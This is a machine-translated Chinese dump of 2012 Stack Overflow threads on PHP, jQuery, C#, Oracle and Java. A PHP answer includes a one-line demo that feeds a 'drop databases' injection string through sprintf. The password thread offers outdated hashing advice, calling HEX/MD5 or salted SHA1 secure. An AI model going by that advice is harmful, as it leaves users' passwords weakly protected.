但这是一个*潜在*的漏洞：如果某个维护程序员决定执行一个小的更改并且忘记了变量可能被污染，或者如果变量的数据类型从整数更改为字符串（以及说明符为`%s`） - 那么会有麻烦。

最好一开始就不要去那里（但从实际的角度来看，加强对遗留代码的防御是否值得也并不明显）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:05:19.057

要回答您的问题，以您提供的方式使用 sprintf 应该避免任何 sql 注入，因为通过 %d 将任何非 int 值转换为十进制值只会取值为 0：

```
$ -> php -r "echo sprintf('update table where id = %d', 'drop databases');"
update table where id = 0 
```

但是，如果我没有试图说服您使用[PDO](http://us.php.net/pdo) API，更具体地说，是使用[准备好的语句](http://us.php.net/manual/en/pdo.prepare.php)，那么我将是失职的。我相信[mysqli](http://us.php.net/mysqli) API 也有准备好的语句，但我从未使用过它们，只使用过 PDO 准备，或者像 Doctrine 或 Propel 这样的 ORM。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T22:00:18.257

它作为输入看起来足够安全，但从用户体验的角度来看，它肯定是不可取的，因为如果输入与 id 属性所需的参数不匹配，您将无法向用户提供详细信息.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T20:13:37.480

理论上，它不应该是易受攻击的，因为`sprintf()`如果它不是数字，就不会插入变量。

然而，这并不意味着它是正确的。它仍然可能导致可能破坏您的代码的错误。

无论这是否易受攻击，我都强烈建议`mysql_xx()`完全放弃这些功能。

旧的 MySQL 库已被弃用（请参阅[PHP 手册页](http://www.php.net/manual/en/function.mysql-query.php)上的注释），建议切换到 PDO 或`mysqli_xx`库。

PDO 和 MySQL 都带有一个名为 Prepared Queries 的功能，它完全可以完成您在此处尝试实现的功能，并且是比`sprintf()`此类事情更好的解决方案。也无需为 SQL 转义所有变量。

希望有帮助。

# html - 将外部 Html 合并到 jQuery Mobile 页面中

> ID：11786310
> 
> 赞同：3
> 
> 时间：2012-08-02T21:48:52.243
> 
> 标签：html, jquery-mobile, load, external, inject

我正在尝试将外部 html 源动态合并到 jQuery 移动页面中。我能够成功地合并外部 html，但它看起来像普通的 HTML（即不受 jQuery 移动影响的 Html）。谁能建议我可能做错了什么？

主要的HTML：

```
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.0-rc.1/jquery.mobile-1.1.0-rc.1.min.css"
    />
    <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
    <script src="http://jqueryui.com/ui/jquery-1.7.1.js"></script>
    <script src="http://code.jquery.com/mobile/1.1.0-rc.1/jquery.mobile-1.1.0-rc.1.min.js"></script>
    <script>
        $(document).ready(function () {
            $("#main").load('externalHtml.html');
            //$("#main").append('externalHtml.html');
            //$("#main").load('externalHtml.html #contain');
            //$("#main").page();
        });
    </script>
</head>

<body>
    <div data-role="content">
        <div id="main"></div>Main Page</div>
</body> 
```

外部HTML.html：

```
<html>
<head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
                <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.0-rc.1/jquery.mobile-1.1.0-rc.1.min.css"/>
        <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
        <script src="http://jqueryui.com/ui/jquery-1.7.1.js"></script>
        <script src="http://code.jquery.com/mobile/1.1.0-rc.1/jquery.mobile-1.1.0-rc.1.min.js"></script>
 </head>
<body>
external html
<div data-role="content" id="contain">
<input  type="search" name="name" id="name" value="" />
 </div>
      </body>
      </html> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T21:54:52.960

如果您`.trigger('create')`在容器元素上，jQuery Mobile 将自动初始化容器内的任何小部件。例如：

```
$("#main").load('externalHtml.html').trigger('create'); 
```

他们确实应该更好地记录这一点，但是如果您查看每种类型的小部件的 API 事件，您将看到有关该`create`事件的文档。

另外，请阅读文档页面的顶部：http: [//jquerymobile.com/demos/1.1.1/docs/api/events.html](http://jquerymobile.com/demos/1.1.1/docs/api/events.html)

您不应该使用`document.ready`，而是应该绑定到`pageinit`伪页面的事件。将来使用`document.ready`很可能会给您带来麻烦。

**- 更新 -**

您可能需要调用`.trigger('create')`回调，以便在尝试初始化外部 HTML 之前加载它：

```
$("#main").load('externalHtml.html', function () {
    $(this).trigger('create');
}); 
```

# c# - 如何在不提升权限的情况下测试用户是否在内置管理员组中？

> ID：11786311
> 
> 赞同：3
> 
> 时间：2012-08-02T21:48:52.370
> 
> 标签：c#, security, .net-2.0

我期望这段代码：

```
WindowsPrincipal principal = new WindowsPrincipal( WindowsIdentity.GetCurrent() );
public bool UserHasAdminRights( WindowsPrincipal principal, WindowsBuiltInRole role )
{
  bool isAdmin;

  // get the role information of the current user
  if ( principal.IsInRole( role ) )
  {
    isAdmin = true;
  }
  else
  {
    isAdmin = false;
  }
  return isAdmin;
} 
```

当用户在内置管理员组中时 返回**true 。**

**然而**

`IsInRole`各州的[MSDN ：](http://msdn.microsoft.com/en-us/library/system.security.principal.windowsbuiltinrole.aspx)

> 在 Windows Vista 中，用户帐户控制 (UAC) 确定用户的权限。如果您是 Built-in Administrators 组的成员，则会为您分配两个运行时访问令牌：一个标准用户访问令牌和一个管理员访问令牌。默认情况下，您是标准用户角色。当您尝试执行需要管理权限的任务时，您可以使用“同意”对话框动态提升您的角色。执行 IsInRole 方法的代码不显示同意对话框。如果您是标准用户角色，即使您在内置管理员组中，代码也会返回 false。在执行代码之前，您可以通过右键单击应用程序图标并指示您要以管理员身份运行来提升您的权限。

问题是如何修改此代码以使其返回 true，如果用户在内置 Admin 组中，**而不**要求用户在运行时/之前提升权限？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:25:24.627

由于我不能像在这里一样整齐地在评论中发布代码，所以让我建议一些伪代码

```
var user = Windows.GetThisUser( me ); //current method (I said pseudo code)
function CheckIfImAdmin( user ) .... //current method 
```

建议的方法：

```
var administrativeUsers = Windows.GetUsersInRole( "admin" ); //use a SID here, much more reliable
foreach(user in administrativeUsers){
  if (user == me) return true;
  return false;
} 
```

虽然这看起来一样，但事实并非如此。而不是查询用户以查看它当前是否处于给定角色（未升级不是），我专注于管理员*是*谁，然后询问该组是否包含我想要的用户，即当前用户。

# javascript - 出于缓存原因在不存在的元素上调用 Jquery 的开销

> ID：11786314
> 
> 赞同：2
> 
> 时间：2012-08-02T21:48:56.473
> 
> 标签：javascript, jquery, html

如果 JQuery 调用不存在的元素，这样做的开销是多少？它不会引发任何错误，但除了加载脚本之外，还有很多 cpu 开销吗？这是为班级还是为身份完成的重要吗？

出于缓存原因和将同时连接保持在最低限度的原因，我将每个页面的所有 onload 脚本都保存在一个文件中，但我想知道告诉我的 javascript 它在哪个页面上并只加载位是否有效通过 if 语句或 switch 语句在该页面上实际运行的代码。我不想将它们放在单独的文件中，因为我希望每个页面在初次访问后尽可能多地从缓存中加载。

例如，您在主页上，但该文件或 onload 中包含产品页面 javascript。

```
$('#product_options').hover(function(){},function(){}); 
```

但是 product_options 在此页面上不存在，因为它是主页。

它对诸如此类的课程有影响吗

```
$('.addtocart').click(function(){}) 
```

应该注意的是，这不会在 JQuery 中引发任何错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T21:53:43.880

jQuery 有一个特殊的“快速”路径来处理单个 id 选择器，例如`#product_options`; 所有其他选择器都以更复杂的方式处理。如果您继续使用 id 选择器，则性能影响将无法衡量。

如果您使用其他选择器，那么对性能的影响会相对更大*，但从*绝对意义上讲，它不太可能产生太大影响，除非我们谈论的是几十个选择器。

但是，您可以通过将代码放入函数中，然后从每个页面仅调用相关的代码**来回避所有这些。**每一页都不会写太多

```
<script type="text/javascript">
$(function() {
    doSomething();
    doSomethingElse();
});
</script> 
```

恕我直言，这是一个很好的平衡，既不将代码分散到多个文件中，又不尝试运行死代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:56:21.913

性能会受到影响，仅仅是因为必须完成工作才能确定没有匹配项。现在，一般来说，这非常小，除非你有一个巨大的、非常令人兴奋的 Javascript 网络应用程序——想想 Facebook，否则你可能不必担心这一点。也就是说，只运行应该在页面上运行的代码仍然是一种很好的做法，我发现最好的方法是 Paul Irish 的方法，[基于标记的不显眼的全面 DOM 就绪执行](http://paulirish.com/2009/markup-based-unobtrusive-comprehensive-dom-ready-execution/)。

# gstreamer - 如何将自定义文件解析器挂接到 Gstreamer 解码器？

> ID：11786318
> 
> 赞同：0
> 
> 时间：2012-08-02T21:49:06.363
> 
> 标签：gstreamer, python-gstreamer

HTTP 文件及其内容已下载并存在于内存中。我只需要将内容传递给 gstreamer 中的解码器并播放内容。但是，我无法找到两者之间的联系。

看了文档，才知道gstreamer是使用httpsoupsrc来下载和解析http文件的。但是，就我而言，我有自己的解析器和文件下载器来做同样的事情。它获取 url 并返回部分数据以供解码器使用。我不确定如何绕过 httpsoupsrc 并使用我的解析器而不是如何将其链接到解码器。

如果有人知道如何做，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T19:56:31.977

你可以使用appsrc。您可以根据需要将数据块传递给应用程序源。

# php - 如何将文本框中的字符串与数据库行中的密码匹配

> ID：11786319
> 
> 赞同：3
> 
> 时间：2012-08-02T21:49:36.100
> 
> 标签：php, mysql, sql, hash

我有一个存储密码的数据库字段，如下所示：

```
TeacherPassword

j.lu01
pesci02
cricket01 
```

现在我有一个文本框，用户在其中输入密码，如果它与其中一行匹配，则导航到下一页。下面是它检查密码的代码。

```
 $teacherpassword = (isset($_POST['teacherpassword'])) ? $_POST['teacherpassword'] : '';

  if (isset($_POST['submit'])) {

    // don't use $mysqli->prepare here
    $query = "SELECT * FROM Teacher WHERE TeacherPassword = ? LIMIT 1";
    // prepare query
    $stmt=$mysqli->prepare($query);
    // You only need to call bind_param once
    $stmt->bind_param("s",$teacherpassword);
    // execute query
    $stmt->execute(); 
    // get result and assign variables (prefix with db)
    $stmt->bind_result($dbTeacherPassword); 
```

但是我所做的是我已经更新了密码字段，以便该字段不会将密码显示为字符串，而是显示为一串字符，以便他们的密码是安全的。以下是我所做的更新：

```
UPDATE Teacher
SET TeacherPassword = Password(TeacherPassword); 
```

这导致密码字段现在看起来像这样：

```
TeacherPassword

    *6FF132E0666AC8462BC
    *FCF5F8CE105D0748315
    *FD4FA4B60EEF1E24050 
```

所以我的问题是，在我的 MYsqli 代码中，如何让在文本框中输入的字符串密码`j.lu01`与其在数据库行中的哈希密码相匹配`*6FF132E0666AC8462BC`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:55:26.940

如果是这种情况，那么您需要先`hash`输入密码，然后再在数据库中搜索密码。顺便说一下，我尝试在 sqlfiddle 上运行并生成不同的哈希值

```
Password('j.lu01') => *7A48257211A5C6BF45C30374789E9027726D829D
Password('jlu_01') => *FCF5F8CE105D0748315591596E8A4F87A2E12B1A

-- your password field is truncated that's why it can't find the match also
-- alter TeacherPassword field and change it's length to 42 
```

***你能检查一下你的`TeacherPassword`字段的长度吗？***

**[SQLFiddle](http://sqlfiddle.com/#!2/76dc8/5)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T21:52:34.653

只需将查询更改为：

```
SELECT * FROM Teacher WHERE TeacherPassword = Password(?) LIMIT 1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T16:35:03.837

您的密码字段限制为 20 个字符，因此您的哈希密码已被修剪为该长度，请尝试：

```
SELECT * FROM Teacher WHERE TeacherPassword = LEFT(Password(?),20) 
```

但 ：

1.  PASSWORD 是 mysql 内部使用的，你应该用 SHA1 代替
2.  您应该真正调整密码字段的大小（如果您仍然有非编码值）。
3.  您应该考虑在对密码进行哈希处理时使用在密码前附加一个随机字符串（例如 6 个字符）对密码进行“加盐”，以便 2 个相同的密码得到不同的编码。

稍后，您需要向`salt`表中添加一列并用一些随机字符串填充它。

然后你可以使用编码：

```
UPDATE Teacher SET TeacherPassword = SHA1(salt @password)

SELECT * FROM Teacher WHERE TeacherPassword = SHA1(salt @password) 
```

* * *

一个非常好的最终解决方案可能是：

```
ALTER TABLE Teacher CHANGE TeacherPassword TeacherPasswordOld VarChar(20)
ALTER TABLE Teacher ADD TeacherPassword VarChar(40)
ALTER TABLE Teacher ADD Salt VarChar(40) 
```

对于 udpate 传递 2 个值：@salt 和 @password

```
Update Teacher SET Salt=@salt, Password=SHA1(Salt @password) 
```

可以像这样在php中生成盐的地方：

```
$salt = ""; 
for ($i = 0; $i < 40; $i++) { 
   $salt .= substr(
     "./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", 
     mt_rand(0, 63), 
     1); 
} 
```

为了检查密码，您将使用

```
SELECT * from Teacher 
-- if no "new" password, check the old one
WHERE TeacherPassword is null and TeacherPasswordOld=LEFT(Password(@password),20)) 
-- else check the new pass
   OR TeacherPassword = Sha1(salt @password) 
```

盐发生器[在这里](http://www.php.net/manual/en/function.crypt.php#109592)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-06T12:43:29.540

您可以编写如下查询：-

```
SELECT * FROM Teacher_Table WHERE HEX(t_password)=HEX('Your_Password') LIMIT 1; 
```

用于`HEX(), MD5()`更好的安全性。此查询在 MySQL 上进行了测试。

不使用上述功能：-

```
 SELECT * FROM Teacher_Table WHERE t_password='Your_Password' LIMIT 1; 
```

您也可以`PASSWORD()`按照上述答案中的说明使用。检索时还有许多其他方法可以使您的查询安全。

建议使用上述功能以避免黑客攻击。

# javascript - 回调 - 通过 jQuery AJAX 解析错误 JSONP

> ID：11786325
> 
> 赞同：1
> 
> 时间：2012-08-02T21:49:58.407
> 
> 标签：javascript, jquery, ajax, callback, jsonp

请考虑以下代码片段：

```
$(function () {
     $.ajax({
        type: "GET",
        url: "http://mosaicco.force.com/siteforce/activeretailaccounts",
        dataType: "jsonp",
        crossDomain: true,
        jsonp: "callback",
        error: function(jqXHR, textStatus, errorThrown) {   
            alert('Error Message: '+textStatus);
            alert('HTTP Error: '+errorThrown);
            },
        success: function (data) {
                var i = 0;
                       //Process JSON
                       $.each(data, function () {
                             var name = this.locname;
                             var lat = this.lat;
                             var lng = this.lng;
                             var address = this.address;
                             var address2 = this.address2;
                             var city = this.city;
                             var state = this.state;
                             var postal = this.postal;
                             var phone = this.phone;
                             var web = this.web;
                             web = web.replace("http://", "");

                             var distance = GeoCodeCalc.CalcDistance(orig_lat, orig_lng, lat, lng, GeoCodeCalc.EarthRadiusInMiles);

                             //Create the array
                             locationset[i] = new Array(distance, name, lat, lng, address, address2, city, state, postal, phone, web);

                             i++;
                      });
                  }
        });
 });​ 
```

我正在拉 JSON 跨域，由于某种原因，我不断收到 parseerror 返回：

```
HTTP Error:Error: jQuery17209875996995251626_1343943259805 was not called 
```

我可以在页面上很好地看到数据 - 回调看起来像这样：

```
callback:jQuery17209875996995251626_1343943259805_:1343943260015 
```

请帮助我诊断我所缺少的 - 谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T15:12:11.253

```
var data = $.parseJSON(data); 
```

由于您正在执行 JSONP 请求，因此您将获得一个传递给回调函数的对象文字。你不能用`parseJSON`那个。无论如何，jQuery 是智能的，如果内容类型已知，它总是会为您解析。

不确定这是否会触发错误消息，但对于[jQuery JSON 响应总是触发 ParseError](https://stackoverflow.com/questions/5095307/jquery-json-response-always-triggers-a-parseerror)的问题，这是解决方案。

* * *

好的，[这](http://jsfiddle.net/ALeez/2/)很简单。查看[它加载的脚本](http://mosaicco.force.com/siteforce/activeretailaccounts?callback=somejQueryFunction)： 这不是[有效的 JSONP](http://en.wikipedia.org/wiki/JSONP) - 它错过了回调*填充*。此外，mime-type 是错误的：对于 JSONP 脚本，它应该是[`text/javascript`或`application/javascript`](https://stackoverflow.com/q/9664282/1048572)，对于他们提供的 JSON，它应该是[`application/json`](https://stackoverflow.com/q/477816/1048572).

jQuery 确实检测到“脚本”的负载，但由于没有执行任何操作，它会抛出“尽管文件已成功加载，但未调用给定回调”的错误 - 怀疑是 parseerror。

您确定网络服务完全支持 JSONP 吗？

# sql - 基于一个查询生成多个类似的报告 - MS Access

> ID：11786326
> 
> 赞同：0
> 
> 时间：2012-08-02T21:50:03.977
> 
> 标签：sql, ms-access, vba, ms-access-2010

我正在尝试从 MS Access 2010 中的一个查询生成许多相关的直方图。我拥有的是两列，一个目标大小和一个现实生活中的测量。我需要按目标大小拆分每个直方图，以便非常清楚哪些测量值是异常值，哪些实际上是另一个目标大小分组的一部分。

我有一个表格，您可以在其中指定您有兴趣查看的目标尺寸，然后是一个查询，该查询将其与其他表格连接起来以提供目标尺寸列表和实际测量值。

前任。

```
+-----------+--------+     +-----------+
| tgtHeight | Height |     | tgtHeight |
+-----------+--------+     +-----------+
| 900       | 984    |     | 900       |
| 900       | 910    |     | 1600      |
| 1600      | 1744   |     +-----------+
| etc...    |        |
+-----------+--------+ 
```

是否可以告诉报告仅在 VBA 或 SQL 中选择 tgtHeight = 900 的第一个表中的值（以我不必为每个 tgtHeight 直方图创建新报告的方式）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:51:47.483

OpenReport 方法包括 where 参数。

```
DoCmd.OpenReport "ReportName", acViewPreview,,"tgtHeight =900" 
```

[http://msdn.microsoft.com/en-us/library/office/bb238032(v=office.12).aspx](http://msdn.microsoft.com/en-us/library/office/bb238032(v=office.12).aspx)

# php - 根据前几个字符串按字母顺序排序数组

> ID：11786332
> 
> 赞同：1
> 
> 时间：2012-08-02T21:50:11.633
> 
> 标签：php, arrays, string

我想对通常包含姓名和电子邮件地址的数组进行排序。问题是电子邮件地址出现在最后，即使它们可能以“a”开头

例如

```
$myarray = ("Alex Mayfeild", "David Beckham", "Oliver Twist", "ant.stev@wherever.com", "peter.pan@neverland.com", ........) //and so on 
```

在使用 php 的排序函数“ant.stev@wherever.com”对数组进行排序后，即使我想要实现的功能是让他出现在 Alex 之后，它也会出现在接近尾声的位置。

基于自然排序的 natcasesort 和 natsource 函数似乎失败了。**更正： natcasesource 工作时，如文档中所述工作时返回 true。谢谢@meagar**

无论如何要实现所要求的功能。感谢您的帮助。这是非常赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T21:55:40.740

`sort()`区分大小写，因为它根据字母 ASCII 值进行排序。

试试[`natcasesort()`](http://php.net/manual/en/function.natcasesort.php)，如果你也想“使用不区分大小写的‘自然顺序’算法对数组进行排序”。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-02T21:55:29.913

在我看来，[`sort($myarray, SORT_STRING|SORT_FLAG_CASE);`](http://php.net/manual/en/function.sort.php)应该按照你想要的方式对数组进行排序。

# iphone - 使用 XCode 向 iPhone 应用程序添加一个复选框（或类似的）

> ID：11786334
> 
> 赞同：3
> 
> 时间：2012-08-02T21:50:28.953
> 
> 标签：iphone, xcode, button, interface, storyboard

当我在编辑器中时，我注意到对象库中有复选框。但是当我转到情节提要时，它们就消失了。那么有没有办法在 iPhone 界面中添加一个复选框，或者它们是否适用于其他平台？如果不可能，还有其他东西可以做同样的工作吗？我正在制作一个搜索功能，如果选中了复选框，我希望在搜索中添加一个条件，这就是为什么我需要这样的东西。谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T21:55:53.087

复选框适用于 OS X。iOS 等价物是开关。如果它们不合适，您可以使用按钮滚动您自己的复选框。

# ruby-on-rails - Heroku :: 没有日志的持久性应用程序错误

> ID：11786336
> 
> 赞同：0
> 
> 时间：2012-08-02T21:50:52.663
> 
> 标签：ruby-on-rails, ruby, heroku

因此，在我的应用程序中，尝试连接到 PayPal 时（有时）会出现应用程序错误。但是，我无法检索此错误的日志。我已经设置`heroku config:add LOG_LEVEL=DEBUG`，但我仍然看不到错误。

我这样做的方法是`heroku logs --tail`查看流式日志文本，这通常有效。

当我的控制台发生错误时，我看到的最后一件事是

```
2012-08-02T21:45:08+00:00 heroku[nginx]: 128.189.198.66 - - [02/Aug/2012:21:45:08 +0000]
"GET / HTTP/1.1" 502 1084 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) 
AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1" weeve.it 
```

这看起来完全正常。

另一个奇怪的事情是，一旦我在浏览器中遇到这个问题，我在访问应用程序的任何页面时都会看到一个应用程序错误，即使是我*知道*没有错误的页面。一旦我清除了我的 cookie，应用程序就会再次正常加载。

任何故障排除提示将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:53:27.067

如果您的 cookie 的内容似乎是导致问题的原因，您可以尝试将 cookie 的内容写入应用程序控制器中 before_filter 的日志中吗

`Rails.logger.info(cookies.inspect)`

让我知道这是否会产生任何见解。

# javascript - 使用 Modernizr 的单元测试代码

> ID：11786343
> 
> 赞同：1
> 
> 时间：2012-08-02T21:51:39.573
> 
> 标签：javascript, unit-testing, requirejs, modernizr, mocha.js

我的问题是关于使用 Mocha 对 JavaScript 代码进行单元测试。最终这可能是一个关于依赖注入或控制反转的问题，我对这些概念的理解很差。

我正在尝试编写一个测试，它只是创建一个 header.js 的实例并测试它是一个对象。但是，每当我这样做时，我的测试在加载 Modernizr 时就会爆炸，并显示以下错误消息。这似乎是因为 Modernizr 依赖于在浏览器内部运行，但我的单元测试需要在命令行上运行。

```
/lib/modernizr.js:8 
```

“MozAppearance”在 l.style,s=r&&!!b.createRange().compareNode,t=s?l:n.parentNod ^ TypeError: 无法读取 /Users/devadmin/devenv/djscript 中未定义的属性 'parentNode' /djscript-vendor/lib/modernizr.js:8:6291

我有一些 requirejs 模块，它们位于以下层次结构中：

```
lib
└── pj
    ├── module
    │   └── header
    │       └── header.js
    ├── util
    │   └── header
    │       └── Util.js
    └── widget
        └── header
            ├── Header.js
            └── view
                ├── HeaderView.js
                └── NavView.js 
```

header.js 实例化 Header.js，后者依次创建 HeaderView 和 NavView。只有 HeaderView 需要 Modernizr。

关于如何使此代码进入可测试状态的任何提示？看看我如何打包 Modernizr 以与 requirejs 一起使用会有所帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T00:43:47.560

好吧，我没有专门使用 Mocha，但是您应该能够通过执行类似...

```
define(<module path/name - e.g. 'libs/modernizr'>, function(){
    return {
        history: false,
        foo: true,
        bar: false
    };
}); 
```

...在您尝试加载被测模块之前。定义了假实例后，您的测试模块应该使用假而不是实际的modernizr lib。

您基本上是在劫持 AMD 的“命名模块”（链接：[http](http://requirejs.org/docs/api.html#modulename) ://requirejs.org/docs/api.html#modulename ）功能，用您的假货代替真正的modernizr。通过这种方式，您可以明确地测试您需要的任何状态。

希望能帮助到你！

# java - CodePro AnalytiX 的构建自动化

> ID：11786349
> 
> 赞同：2
> 
> 时间：2012-08-02T21:52:02.013
> 
> 标签：java, eclipse, ant, code-analysis, codepro

Google CodePro AnalytiX 是否有公开可用的 Ant/Gradle 任务？看起来 Google 收购了 CodePro AnalytiX 并将其变成了一个仅限 Eclipse 的工具。

搜索 CodePro AnalytiX 网页，很明显有一次为该项目定义了 Ant 任务（统称为**CodePro AnalytiX Server**），但这似乎也是一个死项目（我找不到一个）。

我真的非常喜欢 CodePro AnalytiX，但如果有一种方法可以将它作为我们 CI 构建的一部分运行（它基于 Ant，很快将基于 Gradle），那将是非常宝贵的。提前致谢！

# java - 如何在括号内没有属性的情况下进行 @name("Luke") 之类的 Java 注释？

> ID：11786354
> 
> 赞同：49
> 
> 时间：2012-08-02T21:52:22.043
> 
> 标签：java, attributes, annotations, default, parentheses

如何在括号内没有属性名称的情况下进行自定义 Java 注释？

我不想要这个：`@annotation_name(att=valor)`。我只想像在Servlets中一样，即：

```
@WebServlet("/main") 
```

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-08-02T21:53:34.147

使用名为 的属性定义注释`value`，然后可以省略属性*名称：*

```
@interface CustomAnnotation
{
    String value();
} 
```

这可以像这样使用：

```
@CustomAnnotation("/main")
// ... 
```

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-08-02T22:02:40.300

您指定一个名为 value 的属性：

```
public @interface MyAnnotation {

    String value();

} 
```

如果它们具有默认值，则不必是唯一的属性：

```
public @interface MyAnnotation {

    String value();
    int myInteger() default 0;

} 
```

但是如果你想显式地为属性赋值而不是值，那么你必须显式地赋值。也就是说：

```
@MyAnnotation("foo")
@MyAnnotation(value = "foo", myInteger = 1) 
```

作品

但

```
@MyAnnotatino("foo", myInteger = 1) 
```

才不是

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2012-08-02T21:55:45.313

引用[注释官方文档](https://docs.oracle.com/javase/tutorial/java/annotations/basics.html)：

> 如果只有一个元素名为`value`，则名称可以省略，如下所示：

```
@SuppressWarnings("unchecked")
void myMethod() { } 
```

这是这个注解的定义方式：

```
public @interface SuppressWarnings {
  String[] value();
} 
```

如您所见，文档并不完全正确，还允许其他属性（“*仅一个元素*”），请参阅[`WebServlet`](http://docs.oracle.com/javaee/6/api/javax/servlet/annotation/WebServlet.html)- 但命名`value`的属性会有所不同。

# c# - ODP.NET 无法识别 oracle 包中的程序

> ID：11786355
> 
> 赞同：0
> 
> 时间：2012-08-02T21:52:28.980
> 
> 标签：c#, oracle, stored-procedures, package, odp.net

我有一个简单的包定义如下：

```
CREATE OR REPLACE PACKAGE wvParty IS
TYPE refParties IS REF CURSOR; 
```

结束 wvParty；

创建或替换包体 wvParty 正在处理 proc_GetParties( p_party_name IN OUT VARCHAR2, x_party_info OUT refParties ) 开始 p_party_name := '%'||p_party_name||'%';

```
 OPEN x_party_info FOR
    SELECT party_id, party_number, party_type, party_name, 
        person_first_name, person_middle_name, person_last_name,
        known_as, known_as2, known_as3, known_as4, known_as5
    FROM hz_parties
    WHERE 1=1
    AND party_name LIKE p_party_name; 
END; 
```

结束 wvParty；

它在 oracle db 中创建，没有错误。在我的代码中，我尝试使用以下方法调用它：

```
 try
  {
    OracleConnection conn = new OracleConnection(_connStr);
    conn.Open();
    OracleCommand cmd = conn.CreateCommand();
    cmd.CommandText = "wvParty.proc_GetParties";
    cmd.CommandType = CommandType.StoredProcedure;

    OracleParameter partyName = new OracleParameter();
    partyName.ParameterName = "p_party_name";
    partyName.OracleDbType = OracleDbType.Varchar2;
    partyName.Direction = ParameterDirection.InputOutput;
    partyName.Value = "Bubba";
    cmd.Parameters.Add(partyName);

    OracleParameter refParties = new OracleParameter();
    refParties.ParameterName = "x_party_info";
    refParties.OracleDbType = OracleDbType.RefCursor;
    refParties.Direction = ParameterDirection.Output;
    cmd.Parameters.Add(refParties);

    OracleDataReader rdr = cmd.ExecuteReader(); 
```

然而，当我这样做时，我得到了错误：

PLS-00302：必须声明组件“PROC_GETPARIES”。

所以我很茫然。我已经创建了 proc 作为包的一部分，我已经按照我认为应该的方式声明了它，但是我在解决这个问题时收效甚微。有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T01:28:18.670

我无法评论 C# 方面的事情，但 Oracle 方面存在一些问题，例如：

1.  `proc_GetParties`在包体中定义，但未在包规范中声明。这意味着它在包体之外是不可见的。这解释了您收到`PLS-00302`错误的原因。
2.  子句中`1=1`不需要条件。`WHERE`
3.  您是否真的要更改`p_party_name`过程中的值并使调用者可以看到该更改？如果不是，最好`p_party_name`保持不变并将`LIKE`条件更改为`party_name LIKE '%' || p_party_name || '%'`。

# php - PHP中的Javascript PHP中的Javascript

> ID：11786361
> 
> 赞同：-5
> 
> 时间：2012-08-02T21:52:51.930
> 
> 标签：php, javascript

我有一个包含 javascript 函数的 PHP 文件。该函数将“user”作为参数。如何在嵌入式 PHP 中包含此参数？

```
$("#items-table").html("<p><?php echo(hello " + user + "); ?></p>") 
```

我得到的错误是：

> 解析错误：语法错误，意外的 T_CONSTANT_ENCAPSED_STRING

我必须以单独的块附加到 html 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T21:57:17.897

```
$("#items-table").html("<p><?php echo "hello $user"); ?></p>") 
```

如果变量在php端

```
$("#items-table").html("<p><?php echo "hello"; ?> + user + " </p>") 
```

如果变量在客户端，但你想和 php 打个招呼

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T21:54:32.727

PHP 是服务器端语言，JavaScript 是客户端语言。实现您想要完成的唯一方法是运行页面并首先让 PHP 处理它需要的内容，然后将页面发送给客户端，让客户端处理他或她需要的内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T22:00:46.570

实际上可以在服务器端使用 php 影响您的 javascript，然后将其发送到客户端以供浏览器评估，尽管我建议不要这样做并尝试使用 ajax。

如果您确实想这样工作，您的代码示例应该看起来更像这样：

```
$("#items-table").html("<p><?php echo("hello " . $user); ?></p>"); 
```

这是假设 $user 是您在 php 脚本中的其他位置设置的变量。该错误表明您缺少 php.ini 中所有变量所需的 $ 符号。现在php编译器认为`user`是一个常量，解释错误信息...

# versioning - 在 Bazaar 中对一个根项目的多个子项目进行版本控制

> ID：11786362
> 
> 赞同：1
> 
> 时间：2012-08-02T21:53:04.340
> 
> 标签：versioning, bazaar

目前在 Bazaar 中对一个根项目的多个子项目进行版本控制的最佳方法是什么？

我熟悉`bzr-externals`和`scmproj`。我更喜欢`bzr-externals`，因为它允许使用内置命令（我正在使用`Bazaar Explorer`），但是它似乎缺少一些我想要的功能。

我的项目如下所示：

```
